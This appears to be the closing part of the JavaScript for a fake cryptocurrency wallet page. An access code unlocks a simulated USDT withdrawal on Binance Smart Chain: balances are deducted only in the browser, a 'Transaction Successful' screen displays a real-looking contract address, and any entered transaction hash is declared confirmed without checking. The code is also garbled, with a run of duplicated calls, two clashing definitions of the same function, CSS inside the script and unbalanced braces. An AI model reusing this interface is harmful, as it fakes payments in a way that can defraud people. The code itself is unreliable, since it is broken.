          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
          // (Note: The above lines repeated mistakenly due to script code error, will fix below)
        }, 10000);
      } else {
        showPage('page11');
      }
    }, 1500);
  }

  // Correct validateAccessCode fix (replacing the above)
  function validateAccessCode() {
    const code = document.getElementById('accessCodeInput').value.trim();
    if(!code) {
      alert('Please enter the access code.');
      return;
    }
    showPage('page10'); // show processing
    setTimeout(() => {
      if(code === 'BNBDev467'){
        // Deduct balances
        const amount = parseFloat(document.getElementById('transferAmount').value);
        usdtBalance = Math.max(0, usdtBalance - amount);
        bnbBalance = Math.max(0, bnbBalance - 0.0949);
        updateBalances();

        // Show success page after delay
        setTimeout(() => {
          showPage('page10'); // Still show processing briefly
          setTimeout(() => {
            showPage('page10'); // continued
            setTimeout(() => {
              showPage('page10');
              setTimeout(() => {
                showPage('page10');
              }, 300);
            }, 300);
          }, 300);
        }, 1500);

        // After short delay show success page with details
        setTimeout(() => {
          showSuccessPage(amount, document.getElementById('inputWallet').value.trim());
        }, 3500);

      } else {
        showPage('page11');
      }
    }, 1500);
  }

  // Show transaction success page with details
  function showSuccessPage(amount, receiverAddress) {
    const page = document.getElementById('page10');
    page.innerHTML = `
      <h2 style="color:#2ecc71;">‚úÖ Transaction Successful</h2>
      <p><strong>Withdrawn Amount:</strong> ${amount.toFixed(2)} USDT</p>
      <p><strong>Receiver Address:</strong> ${receiverAddress}</p>
      <p><strong>Network:</strong> Binance Smart Chain (BEP-20)</p>
      <p><strong>From Contract Address:</strong> 0x55d398326f99059ff775485246999027b3197955</p>
      <button onclick="showPage('homepage')" style="margin-top:24px;">Back to Homepage</button>
    `;
    showPage('page10');
  }

  // Submit transaction on Receive page (page 6)
  function submitTransaction() {
    const txHash = document.getElementById('txHash').value.trim();
    if(!txHash) {
      alert('Please enter a transaction hash.');
      return;
    }
    // For demo, just show success
    const statusDiv = document.getElementById('txStatus');
    statusDiv.style.color = '#2ecc71';
    statusDiv.innerText = 'Transaction confirmed successfully!';
  }
  // Live chat open
  function openLiveChat(){
    window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank');
  }

  // Update wallet display on page load
  updateWalletDisplay();
  }
  
  @keyframes spin {
    0% {transform: rotate(0deg);}
    100% {transform: rotate(360deg);}
  }
  });
    // Utility to show page by id and hide others
  function showPage(pageId) {
  const pages = document.querySelectorAll('.page');
  pages.forEach(p => p.classList.remove('visible'));
  const target = document.getElementById(pageId);
  if (target) {
    target.classList.add('visible');
    // Save the current page id to localStorage
    localStorage.setItem('currentPage', pageId);
  }
  }

  function showPage(pageNumber) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
      page.style.display = 'none';
      page.style.opacity = 0;
    });

    const targetPage = document.getElementById('page' + pageNumber);
    targetPage.style.display = 'block';

    // Animate opacity (simple fade-in)
    setTimeout(() => {
      targetPage.style.opacity = 1;
      targetPage.style.transition = 'opacity 0.4s ease';
    }, 10);

    // Remember last page
    localStorage.setItem('lastPage', pageNumber);
  }

  // Load last page or default to Homepage (page 4)
  window.addEventListener('load', () => {
    const savedPage = localStorage.getItem('lastPage') || '5';
    showPage(savedPage);
  });
  document.addEventListener('DOMContentLoaded', () => {
  const savedPage = localStorage.getItem('currentPage');
  if(savedPage && document.getElementById(savedPage)) {
    showPage(savedPage);
  } else {
    // Default page if nothing saved
    showPage('page4'); // or your default page id, e.g., 'homepage'
  }
  });
  
</script>

</body>
  </html>
    

